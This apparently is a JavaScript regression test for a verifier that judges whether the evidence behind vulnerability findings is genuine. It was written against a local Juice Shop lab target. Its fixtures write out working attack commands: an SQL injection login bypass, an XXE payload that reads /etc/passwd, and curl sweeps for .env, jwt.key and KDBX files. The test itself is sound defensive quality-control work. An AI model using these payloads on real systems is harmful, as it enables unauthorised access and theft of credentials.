// Regression test for the solver #454 verifier content-relevance judgement
// (Job 7 item C). Run: node backend/scripts/test-content-relevance.mjs
//
// Background: the #442 execution gate blocks FAILED executions, but a
// SUCCESSFUL command could still stamp verified:true with content that
// does not prove the claim — audited shapes on h_bench_d69e5746:
//   #73/#76/#78/#81 sweep probes whose own output says "not exposed: …"
//     for every file, while extractSignal fires on the '.env' filename;
//   #259/#260 probes of a DIFFERENT host (target.com) whose 301 headers
//     echo '/admin' in the Location line;
//   #233/#256/#257 PoC stamps over the target's own homepage CSS.
// assessContentRelevance binds evidence to claim: on-target host +
// non-negated supporting signal + signal text novel vs the target's
// baseline bodies. Fixtures below are the REAL evidence shapes extracted
// from the production events.jsonl (finding numbers = finding-event
// ordinals in that stream).
import { assessContentRelevance, supportingSignalLines, extractLinkedAssetUrls } from '../src/hunt-intel/differential.js';

let failures = 0;
function check(name, cond) {
  console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}`);
  if (!cond) failures++;
}
const TARGET = 'http://172.17.0.1:3000';
// Ambient baseline: the target's generic bodies. On the real target the
// root and canary bodies are byte-identical SPA shells (80,117 bytes,
// verified live) carrying no signal vocabulary at all; this synthetic
// ambient page additionally pins limb 3 with signal-bearing ambient text.
const AMBIENT = '<html><head><title>Shop</title></head><body>Admin dashboard — staff token login portal. All rights reserved.</body></html>';
const BASELINES = [AMBIENT];

// --- Genuine class 1: SQLi authentication bypass (finding #2, real) -------
const sqli = assessContentRelevance({
  command: `curl -sk -X POST "http://172.17.0.1:3000/rest/user/login" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op' OR 1=1--","password":"x"}' | head -c 2000`,
  target: TARGET,
  output: '{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ',
  baselines: BASELINES,
});
check('genuine SQLi login bypass is relevant', sqli.relevant === true);

// --- Genuine class 3: XXE file disclosure (finding #92, real) --------------
// Note: the label line ends "WITHOUT authentication" — the negation cue
// comes AFTER the signal match and must not negate it.
const xxe = assessContentRelevance({
  command: `R=$(printf '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY c SYSTEM "file:///etc/passwd">]><r>&c;</r>' >/tmp/xe.xml; curl -sk -X POST -F "file=@/tmp/xe.xml" "http://172.17.0.1:3000/file-upload"); echo "$R"|grep -q 'root:' && echo 'XXE VULNERABLE'`,
  target: TARGET,
  output: 'XXE VULNERABLE: external entity resolved - /etc/passwd disclosed (root:x:0:0) EXPOSED in error response WITHOUT authentication\n',
  baselines: BASELINES,
});
check('genuine XXE disclosure is relevant (trailing WITHOUT does not negate)', xxe.relevant === true);

// --- Genuine class 2: FTP listing + KDBX exposure (finding #55, real) -----
const kdbx = assessContentRelevance({
  command: `{ echo '--- /ftp/ directory listing ---'; curl -sk "http://172.17.0.1:3000/ftp/"|grep -o 'href="[^"]*"'; for f in incident-support.kdbx eastere.gg; do r=$(curl -sk -o /dev/null -w "%{http_code}" "http://172.17.0.1:3000/ftp/$f"); echo "$f $r"; done; }`,
  target: TARGET,
  output: '--- /ftp/ directory listing ---\nhref="."\nhref=""\nhref="quarantine"\nhref="acquisitions.md"\nhref="announcement_encrypted.md"\nhref="coupons_2013.md.bak"\nhref="eastere.gg"\nhref="encrypt.pyc"\nhref="incident-support.kdbx"\nincident-support.kdbx 200',
  baselines: BASELINES,
});
check('genuine FTP/KDBX exposure is relevant', kdbx.relevant === true);

// --- False-accept family: negated sweep output (#73, real) -----------------
const negated = assessContentRelevance({
  command: `{ for f in jwt.key .env config.json; do r=$(curl -sk -o /dev/null -w "%{http_code} %{size_download}" "http://172.17.0.1:3000/rest/continue-code/apply/$f"); [ "\${r%% *}" = 200 ] && echo "EXPOSED: $f" || echo "not exposed: /rest/continue-code/apply/$f"; done; }`,
  target: TARGET,
  output: 'not exposed: /rest/continue-code/apply/jwt.key\nnot exposed: /rest/continue-code/apply/.env\nnot exposed: /rest/continue-code/apply/config.json\n',
  baselines: BASELINES,
});
check('#73 "not exposed" sweep output is rejected (negated signal)', negated.relevant === false);

// --- False-accept family: off-target host (#259, real) ---------------------
const offTarget = assessContentRelevance({
  command: `curl -I -X GET 'https://target.com/admin/users?limit=1000'`,
  target: TARGET,
  output: 'HTTP/2 301 \r\nserver: Varnish\r\nretry-after: 0\r\nlocation: https://www.target.com/admin/users?limit=1000\r\naccept-ranges: bytes\r\nvia: 1.1 varnish\r\n',
  baselines: BASELINES,
});
check('#259 target.com 301 evidence is rejected (off-target host)', offTarget.relevant === false);

// --- False-accept family: placeholder host with content (#236 shape) -------
const placeholder = assessContentRelevance({
  command: `curl -s 'https://target-app/admin?param=value'`,
  target: TARGET,
  output: '<html><body>admin dashboard token</body></html>',
  baselines: BASELINES,
});
check('target-app placeholder host evidence is rejected', placeholder.relevant === false);

// --- False-accept family: ambient page content as evidence (limb 3) --------
const ambient = assessContentRelevance({
  command: `curl -s http://172.17.0.1:3000/admin`,
  target: TARGET,
  output: AMBIENT,
  baselines: BASELINES,
});
check('ambient baseline content itself is rejected (signal not novel)', ambient.relevant === false);

// --- False-accept family: homepage CSS PoC output (#233/#256, real) -------
const css = assessContentRelevance({
  command: `curl -s 'http://172.17.0.1:3000/admin/search?limit=100&offset=0'`,
  target: TARGET,
  output: 'lbar-container-text-color:white}.bluegrey-lightgreen-theme{--mat-tree-container-background-color:#424242;--mat-tree-node-text-color:white}.bluegrey-lightgreen-theme{--mat-timepicker-container-shape:4px;',
  baselines: BASELINES,
});
check('#256 homepage CSS output is rejected (no supporting signal)', css.relevant === false);

// --- False-accept family: timing-only PoC output (#246 shape) --------------
const timing = assessContentRelevance({
  command: `curl -s -o /dev/null -w "%{time_total}" http://172.17.0.1:3000/admin`,
  target: TARGET,
  output: '0.129025',
  baselines: BASELINES,
});
check('#246 timing-numbers output is rejected (no signal)', timing.relevant === false);

// --- Placeholder TARGET in the command still counts as the target ---------
const placeholderOk = assessContentRelevance({
  command: `curl -sk -X POST "http://TARGET/rest/user/login" -d '{"email":"a' OR 1=1--","password":"x"}'`,
  target: TARGET,
  output: '{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIn0","email":"admin@juice-sh.op"}',
  baselines: BASELINES,
});
check('TARGET placeholder command with genuine evidence stays relevant', placeholderOk.relevant === true);

// --- Novelty limb abstains when no baseline was fetched --------------------
const abstain = assessContentRelevance({
  command: `curl -s http://172.17.0.1:3000/rest/user/login`,
  target: TARGET,
  output: '{"token":"eyJhbGciOi","email":"admin@juice-sh.op"}',
  baselines: [],
});
check('empty baselines: novelty abstains, host+signal limbs still pass', abstain.relevant === true);

// --- Asset corpus extension (solver #456, Job 8 item 3) --------------------
// The #233/#256 stamps were judged against root + canary only; the corpus
// now includes the root page's linked CSS/JS asset bodies. The extractor
// is same-origin-only and bounded; asset bodies join limb 3's corpus.
const SHELL = '<html><head><link rel="stylesheet" href="styles.abc123.css"><link rel="stylesheet" href="/assets/theme.css"><script src="main.def456.js"></script><script src="https://cdn.example.net/lib.js"></script><link rel="stylesheet" href="styles.abc123.css"></head><body>shop</body></html>';
const assets = extractLinkedAssetUrls(SHELL, TARGET + '/');
check('asset extractor: same-origin CSS/JS only, deduped, resolved',
  assets.length === 3
  && assets.includes('http://172.17.0.1:3000/styles.abc123.css')
  && assets.includes('http://172.17.0.1:3000/assets/theme.css')
  && assets.includes('http://172.17.0.1:3000/main.def456.js'));
check('asset extractor: unparseable base yields []', extractLinkedAssetUrls(SHELL, '').length === 0);
check('asset extractor: cap honoured', extractLinkedAssetUrls(SHELL, TARGET + '/', 2).length === 2);

// Asset-shaped stamp: the "evidence" is a line lifted verbatim from the
// target's own stylesheet (signal word included). With the asset body in
// the corpus the novelty limb must reject it; without it, it would pass.
const CSS_ASSET = 'body{margin:0}.admin-token-badge{color:#fff;background:url(assets/admin/token.png)}';
const assetStamp = assessContentRelevance({
  command: `curl -s http://172.17.0.1:3000/styles.abc123.css`,
  target: TARGET,
  output: CSS_ASSET,
  baselines: [AMBIENT, CSS_ASSET],
});
check('asset-shaped stamp rejected when asset body is in the corpus', assetStamp.relevant === false);
const assetStampNoCorpus = assessContentRelevance({
  command: `curl -s http://172.17.0.1:3000/styles.abc123.css`,
  target: TARGET,
  output: CSS_ASSET,
  baselines: BASELINES,
});
check('same stamp without the asset corpus would pass (extension is what binds it)', assetStampNoCorpus.relevant === true);
// Genuine evidence stays relevant with an asset corpus present.
const sqliWithAssets = assessContentRelevance({
  command: `curl -sk -X POST "http://172.17.0.1:3000/rest/user/login" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op' OR 1=1--","password":"x"}'`,
  target: TARGET,
  output: '{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ',
  baselines: [AMBIENT, CSS_ASSET],
});
check('genuine SQLi stays relevant with asset corpus present', sqliWithAssets.relevant === true);

// --- supportingSignalLines unit behaviour ----------------------------------
check('negated line yields no support', supportingSignalLines('not exposed: /x/.env').length === 0);
check('negation before signal negates ("no sql error occurred")', supportingSignalLines('no sql error occurred').length === 0);
check('signal before negation still supports', supportingSignalLines('root:x:0:0 disclosed without auth').length === 1);
check('plain signal line supports', supportingSignalLines('{"email":"admin@juice-sh.op"}').length === 1);

console.log(failures === 0 ? '\nALL TESTS PASSED' : `\n${failures} TEST(S) FAILED`);
process.exit(failures === 0 ? 0 : 1);
